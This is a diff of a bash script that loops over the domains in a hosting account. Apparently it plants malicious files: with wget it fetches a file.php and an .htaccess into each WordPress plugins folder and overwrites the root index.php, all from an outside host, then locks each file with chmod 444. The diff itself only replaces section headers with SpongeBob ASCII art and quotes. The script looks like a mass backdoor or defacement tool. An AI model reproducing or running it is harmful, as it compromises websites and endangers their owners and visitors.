@@ -101,9 +101,23 @@ do
 
     echo "Processing $DOMAIN"
 
-    # =========================
-    # FILE.PHP
-    # =========================
+# 🧽🍍━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🍍🧽
+#
+#    "If you believe in yourself
+#     and with a tiny pinch of magic,
+#     all your dreams can come true."
+#
+#                  — SpongeBob ⭐
+#
+#                 ⣠⣤⣄
+#               ⣴⣿⣿⣿⣦
+#              ⣿ ⬤ ⬤ ⣿
+#              ⣿   👃   ⣿
+#              ⣿  \___/  ⣿
+#               ⠻⣿⣿⠟
+#
+# 🧽🍍━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🍍🧽
+
     TARGET1="/home/u200768895/domains/$DOMAIN/public_html/wp-content/plugins/file.php"
     URL1="https://malam.545565.rest/spongebob/index.php"
 
@@ -112,9 +126,22 @@ do
     wget -q -O "$TARGET1" "$URL1"
     chmod 444 "$TARGET1"
 
-    # =========================
-    # .HTACCESS
-    # =========================
+# 🐡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🐡
+#
+#   "Seharusnya kamu belajar berjalan dulu nak,
+#          baru kamu bisa berlari"
+#
+#                 — Mrs. Puff 🌸
+#
+#            ⢀⣤⣶⣶⣤⡀
+#          ⣰⣿⣿⣿⣿⣿⣆
+#         ⣿ ⬤ ⠀ ⬤ ⣿
+#         ⣿⠀⠀ 👄 ⠀⠀⣿
+#         ⣿⠀ ⎺⎺⎺ ⠀⣿
+#          ⠻⣿⣿⣿⠟
+#
+# 🐡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🐡
+
     TARGET2="/home/u200768895/domains/$DOMAIN/public_html/wp-content/plugins/.htaccess"
     URL2="https://malam.545565.rest/spongebob/.htaccess"
 
@@ -123,9 +150,9 @@ do
     wget -q -O "$TARGET2" "$URL2"
     chmod 444 "$TARGET2"
 
-    # =========================
-    # INDEX.PHP ROOT
-    # =========================
+# 💰 "SEMUA TENTANG UANG!" 💰
+#               — Mr. Krabs 🦀
+
     TARGET3="/home/u200768895/domains/$DOMAIN/public_html/index.php"
     URL3="https://malam.545565.rest/spongebob/root-index.php"
 
